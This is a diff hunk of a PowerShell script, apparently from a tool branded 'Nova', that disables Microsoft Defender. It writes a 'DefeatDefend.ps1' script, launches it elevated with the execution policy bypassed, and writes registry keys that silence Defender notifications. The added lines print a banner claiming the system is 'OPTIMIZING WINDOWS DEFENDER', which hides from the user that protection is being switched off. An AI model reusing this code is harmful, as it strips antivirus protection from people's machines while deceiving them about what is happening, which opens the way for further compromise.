@@ -559,6 +559,16 @@ defeatMsMpEng
 $script = New-Item "$env:TEMP\DefeatDefend.ps1" -Value $code -Force
 $run = "Start-Process powershell.exe -Verb RunAs -ArgumentList '-ExecutionPolicy Bypass -File `"$($script.FullName)`"'"
 
+Write-Host "############################################################" -ForegroundColor Magenta
+Write-Host "#                                                          #" -ForegroundColor Magenta
+Write-Host "#       NOVA: OPTIMIZING WINDOWS DEFENDER...               #" -ForegroundColor White
+Write-Host "#       PLEASE DO NOT CLOSE THIS WINDOW!                   #" -ForegroundColor Yellow
+Write-Host "#                                                          #" -ForegroundColor Magenta
+Write-Host "#       The system will finish configuration shortly.      #" -ForegroundColor White
+Write-Host "#                                                          #" -ForegroundColor Magenta
+Write-Host "############################################################" -ForegroundColor Magenta
+Write-Host ""
+
 #disable notifications and others that are allowed while defender is running
 Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications' /v 'DisableEnhancedNotifications' /t REG_DWORD /d '1' /f *>$null
 Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications' /v 'DisableNotifications' /t REG_DWORD /d '1' /f *>$null
